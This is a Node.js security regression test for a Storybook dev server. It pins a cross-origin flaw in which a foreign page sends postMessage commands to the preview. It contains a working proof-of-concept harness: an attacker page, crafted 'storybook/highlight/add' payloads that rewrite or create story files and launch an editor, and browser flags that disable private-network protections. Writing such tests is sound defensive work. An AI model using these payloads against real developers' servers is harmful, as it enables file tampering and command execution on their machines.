/*
 * Copyright 2026 Palantir Technologies, Inc. All rights reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * A page that is not a loopback host must not be able to drive the Storybook
 * dev server. These tests fail while storybook 10.2.17 accepts that page's
 * preview messages and passes once the dev server rejects them.
 *
 * Run from the repository root, after dependencies are installed:
 *
 *   node --test packages/react-components-storybook/security/preview-cross-origin.test.mjs
 */
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { createServer } from "node:http";
import { createRequire } from "node:module";
import { mkdtemp, mkdir, readFile, rm, writeFile, chmod } from "node:fs/promises";
import { existsSync, readdirSync } from "node:fs";
import net from "node:net";
import os from "node:os";
import path from "node:path";
import { after, before, describe, test } from "node:test";
import { fileURLToPath } from "node:url";

const packageDir = path.resolve(
  path.dirname(fileURLToPath(import.meta.url)),
  "..",
);
const packageRequire = createRequire(path.join(packageDir, "package.json"));
const storybookPackageJson = packageRequire.resolve("storybook/package.json");
const storybookBin = path.join(
  path.dirname(storybookPackageJson),
  "dist/bin/dispatcher.js",
);
const nodeModulesDir = path.join(packageDir, "node_modules");

const playwright = loadPlaywright();
const { chromium } = playwright;

const ATTACKER_HOST = "storybook-attacker.test";
const STORY_REL = "src/Probe.stories.jsx";
const COMPONENT_REL = "src/Widget.jsx";
const STORY_ID = "probe--default";

const storySource = `import React from "react";

export default { title: "Probe" };

export const Default = {
  args: { label: "before" },
  render: (args) => <button id="probe-target">{args.label}</button>,
};
`;

let projectDir;
let storybook;
let storybookLogs = "";
let attacker;
let attackerOrigin;
let browser;
let editorMarker;

describe("storybook dev preview rejects foreign origins", { concurrency: 1, timeout: 180_000 }, () => {
  before(async () => {
    projectDir = await mkdtemp(path.join(os.tmpdir(), "sb-preview-origin-"));
    editorMarker = path.join(projectDir, "editor-invoked.txt");
    await mkdir(path.join(projectDir, "src"), { recursive: true });
    await mkdir(path.join(projectDir, ".storybook"), { recursive: true });
    await writeFile(path.join(projectDir, STORY_REL), storySource);
    await writeFile(
      path.join(projectDir, COMPONENT_REL),
      "export const Widget = () => null;\n",
    );
    // Same shape as packages/react-components-storybook/.storybook/main.ts:
    // stock framework preview, no security, frame, or origin options.
    await writeFile(
      path.join(projectDir, ".storybook/main.js"),
      `export default {
  stories: ["../src/**/*.stories.jsx"],
  framework: "@storybook/react-vite",
};
`,
    );
    const editorScript = path.join(projectDir, "record-editor.sh");
    await writeFile(
      editorScript,
      `#!/bin/sh
printf '%s\\n' "$1" > ${shellQuote(editorMarker)}
`,
    );
    await chmod(editorScript, 0o755);
    await symlinkNodeModules(projectDir);

    const port = await freePort();
    storybook = spawn(
      process.execPath,
      [
        storybookBin,
        "dev",
        "-p",
        String(port),
        "--host",
        "localhost",
        "--exact-port",
        "--ci",
        "--no-open",
        "--disable-telemetry",
        "--quiet",
      ],
      {
        cwd: projectDir,
        detached: true,
        env: {
          ...process.env,
          LAUNCH_EDITOR: editorScript,
          STORYBOOK_DISABLE_TELEMETRY: "1",
          BROWSER: "none",
          CI: "1",
        },
        stdio: ["ignore", "pipe", "pipe"],
      },
    );
    storybook.stdout.on("data", (chunk) => {
      storybookLogs += chunk.toString();
    });
    storybook.stderr.on("data", (chunk) => {
      storybookLogs += chunk.toString();
    });

    await waitForIndex(port);
    attacker = createServer((req, res) => {
      const encodedPayload = req.url?.startsWith("/payload/")
        ? req.url.slice("/payload/".length)
        : "";
      res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
      res.end(attackerPage(port, encodedPayload));
    });
    await new Promise((resolve) => attacker.listen(0, "127.0.0.1", resolve));
    attackerOrigin = `http://${ATTACKER_HOST}:${attacker.address().port}`;

    browser = await launchBrowser();
  });

  after(async () => {
    await browser?.close().catch(() => {});
    await new Promise((resolve) => attacker?.close(resolve));
    if (storybook?.pid) {
      try {
        process.kill(-storybook.pid, "SIGTERM");
      } catch {
        storybook.kill("SIGTERM");
      }
    }
    if (projectDir) {
      await rm(projectDir, { recursive: true, force: true });
    }
  });

  test("a foreign page cannot rewrite a story file from the preview", async () => {
    const storyPath = path.join(projectDir, STORY_REL);
    const before = await readFile(storyPath, "utf8");
    await drivePreview({
      clickEvent: "saveStoryRequest",
      id: {
        id: "save-1",
        payload: {
          csfId: STORY_ID,
          importPath: `./${STORY_REL}`,
          args: JSON.stringify({ label: "written-by-foreign-origin" }),
        },
      },
      title: "Save marker",
    });
    assert.equal(
      await readFile(storyPath, "utf8"),
      before,
      `foreign origin changed ${STORY_REL}\n${tail(storybookLogs)}`,
    );
  });

  test("a foreign page cannot create a story file from the preview", async () => {
    const before = storyFiles(projectDir);
    await drivePreview({
      clickEvent: "createNewStoryfileRequest",
      id: {
        id: "create-1",
        payload: {
          componentFilePath: COMPONENT_REL,
          componentExportName: "Widget",
          componentIsDefaultExport: false,
          componentExportCount: 1,
        },
      },
      title: "Create marker",
    });
    assert.deepEqual(
      storyFiles(projectDir),
      before,
      `foreign origin created a story file\n${tail(storybookLogs)}`,
    );
  });

  test("a foreign page cannot launch an editor from the preview", async () => {
    await drivePreview({
      clickEvent: "openInEditorRequest",
      id: {
        file: path.join(projectDir, STORY_REL),
        line: 1,
        column: 1,
      },
      title: "Open marker",
    });
    assert.equal(
      existsSync(editorMarker),
      false,
      `foreign origin launched an editor\n${tail(storybookLogs)}`,
    );
  });
});

async function launchBrowser() {
  const args = [
    `--host-resolver-rules=MAP ${ATTACKER_HOST} 127.0.0.1`,
    // The library check is what these tests pin. Chrome's optional
    // local-network prompt is a separate prompt the advisory says does
    // not remove the issue once the developer continues.
    "--disable-features=PrivateNetworkAccessSendPreflights,PrivateNetworkAccessRespectPreflightResults,BlockInsecurePrivateNetworkRequests,PrivateNetworkAccessForNavigations,PrivateNetworkAccessForWorkers",
  ];
  try {
    return await chromium.launch({ channel: "chrome", headless: true, args });
  } catch {
    return chromium.launch({ headless: true, args });
  }
}

function loadPlaywright() {
  try {
    return packageRequire("playwright");
  } catch {
    return packageRequire("playwright-core");
  }
}

async function symlinkNodeModules(destination) {
  const { symlink } = await import("node:fs/promises");
  await symlink(nodeModulesDir, path.join(destination, "node_modules"), "dir");
}

function freePort() {
  return new Promise((resolve, reject) => {
    const server = net.createServer();
    server.once("error", reject);
    server.listen(0, "127.0.0.1", () => {
      const { port } = server.address();
      server.close(() => resolve(port));
    });
  });
}

async function waitForIndex(port) {
  const deadline = Date.now() + 90_000;
  let lastError = "";
  while (Date.now() < deadline) {
    if (storybook.exitCode != null) {
      throw new Error(`storybook exited early\n${storybookLogs}`);
    }
    try {
      const response = await fetch(`http://localhost:${port}/index.json`);
      if (response.ok) {
        const index = await response.json();
        if (index.entries?.[STORY_ID]) return;
        lastError = `index has no ${STORY_ID}`;
      } else {
        lastError = `index status ${response.status}`;
      }
    } catch (error) {
      lastError = error instanceof Error ? error.message : String(error);
    }
    await delay(250);
  }
  throw new Error(`storybook did not serve its index: ${lastError}\n${storybookLogs}`);
}

function attackerPage(storybookPort, encodedPayload) {
  return `<!doctype html>
<html>
  <body>
    <iframe id="sb" style="width:800px;height:600px;border:0"></iframe>
    <script>
      const payload = JSON.parse(decodeURIComponent(${JSON.stringify(encodedPayload)}));
      const frame = document.getElementById("sb");
      frame.src = ${JSON.stringify(`http://localhost:${storybookPort}/iframe.html?id=${STORY_ID}&viewMode=story`)};
      window.__payload = payload;
      window.sendToPreview = () => {
        frame.contentWindow.postMessage(payload, "*");
      };
    </script>
  </body>
</html>`;
}

async function drivePreview({ clickEvent, id, title }) {
  const payload = {
    key: "storybook-channel",
    event: {
      type: "storybook/highlight/add",
      args: [
        {
          selectors: ["#probe-target"],
          menu: [[{ id, title, clickEvent }]],
        },
      ],
      from: ATTACKER_HOST,
    },
  };
  const page = await browser.newPage();
  try {
    const encoded = encodeURIComponent(JSON.stringify(payload));
    await page.goto(`${attackerOrigin}/payload/${encoded}`, {
      waitUntil: "domcontentloaded",
    });
    const frame = page.frameLocator("#sb");
    try {
      await frame.locator("#probe-target").waitFor({ timeout: 30_000 });
      await page.evaluate(() => window.sendToPreview());
      const highlight = frame.locator("[data-highlight-dimensions]");
      await highlight.waitFor({ timeout: 10_000 });
      await highlight.click();
      await frame.locator("#storybook-highlights-menu button").click({
        timeout: 5_000,
      });
    } catch {
      // A fixed server refuses the embed or the message, so the injected
      // control never appears. The assertions below are the pass condition.
    }
    await delay(1_500);
  } finally {
    await page.close();
  }
}

function storyFiles(root) {
  const found = [];
  const visit = (directory) => {
    for (const entry of readdirSync(directory, { withFileTypes: true })) {
      if (entry.name === "node_modules" || entry.name === ".storybook") continue;
      const full = path.join(directory, entry.name);
      if (entry.isDirectory()) visit(full);
      else if (/\.stories\./u.test(entry.name)) found.push(path.relative(root, full));
    }
  };
  visit(root);
  found.sort();
  return found;
}

function shellQuote(value) {
  return `'${value.replaceAll("'", "'\\''")}'`;
}

function tail(value) {
  return value.slice(-2000);
}

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
